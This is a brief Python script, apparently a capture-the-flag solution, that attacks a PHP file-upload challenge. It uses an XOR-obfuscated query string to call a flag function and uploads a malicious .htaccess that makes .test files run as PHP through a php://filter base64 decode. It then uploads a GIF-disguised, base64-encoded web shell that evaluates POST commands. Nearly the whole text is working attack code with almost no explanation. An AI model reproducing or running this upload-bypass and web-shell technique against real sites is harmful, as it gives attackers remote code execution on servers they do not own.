import requests
import base64
url="http://791f95b4-8408-4b2e-bff9-7cd72f403bd9.node4.buuoj.cn:81/?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag"
htaccess=b'''\x00\x00\x85\x48\x85\x18
AddType application/x-httpd-php .test
php_value auto_append_file  "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/1.test"
'''

shell=b"GIF89a"+b"aa"+base64.b64encode(b"<?php @eval($_POST[cmd])?>") #aa为了满足base64算法凑足八个字节

#first_upload ---- to upload .htaccess

files1={
	'file':('.htaccess',htaccess,'image/jpeg')
}
r1=requests.post(url=url,files=files1)
print (r1.text)

#second_upload ---- to upload .shell
#
files2={
	'file':('1.test',shell)
}
r1=requests.post(url,files=files2)
print (r1.text)